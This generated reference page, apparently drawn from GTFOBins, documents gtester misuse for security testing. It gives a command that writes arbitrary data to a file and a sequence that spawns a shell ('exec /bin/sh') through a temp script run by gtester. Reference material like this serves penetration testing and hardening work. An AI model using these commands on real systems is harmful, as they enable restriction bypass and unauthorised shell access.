---
parsed_by: focuslocust
source: commands
type: generated
---
# gtester Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## gtester

Tool page: [gtester](../../tools/linux/gtester.md)

### file-write

```text
gtester DATA -o /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gtester` |
| Evidence | Function example preserved from source parser. |

### shell

```text
echo 'exec /bin/sh 0<&1' >/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gtester` |
| Evidence | Function example preserved from source parser. |
